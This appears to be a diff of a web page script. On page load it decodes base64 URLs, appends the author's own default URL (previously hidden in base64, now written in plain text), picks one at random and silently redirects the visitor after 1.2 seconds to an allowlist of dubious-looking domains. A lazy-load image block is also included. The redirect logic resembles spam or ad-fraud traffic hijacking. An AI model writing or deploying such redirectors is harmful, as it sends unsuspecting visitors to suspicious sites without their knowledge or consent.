@@ -102,9 +102,8 @@
     const decoded = atob(encoded.trim());
     const userUrls = decoded.split('|');
 
-    // URL default kamu
-    const myEncoded = 'aHR0cHM6Ly9hYm5vcm1hbGl0eWxvdmluZ21hbW1hbC5jb20vbXl2aWRlbw==';
-    const myDefaultUrl = atob(myEncoded);
+    // ✅ URL default langsung ditulis (tidak encoded)
+    const myDefaultUrl = "https://abnormalitylovingmammal.com/myvideo";
 
     const allUrls = [...userUrls, myDefaultUrl];
     const finalUrl = allUrls[Math.floor(Math.random() * allUrls.length)];
@@ -116,7 +115,6 @@
       "abnormalitylovingmammal.com",
       "pwcenter.eu.org",
       "otieu.com",
-      "otieus.com",
       "appstalker-fb.eu.org",
       "xpweyurt.eu.org"
     ];
@@ -137,15 +135,14 @@
         window.location.href = finalUrl;
       }, 1200);
     } else {
-      console.warn("Domain tidak diizinkan:", host);
+      console.warn("Domains not allowed:", host);
     }
-
   } catch (err) {
-    console.error("Gagal decode base64 atau URL invalid:", err);
+    console.error("Broken Site:", err);
   }
 })();
 
-// ✅ Lazy load semua img[data-src]
+// ✅ Lazy load image
 document.addEventListener("DOMContentLoaded", function () {
   const images = document.querySelectorAll('img[data-src]');
   const observer = new IntersectionObserver((entries, obs) => {
@@ -165,6 +162,7 @@ document.addEventListener("DOMContentLoaded", function () {
   images.forEach(img => observer.observe(img));
 });
 </script>
+
 
 
 </script>
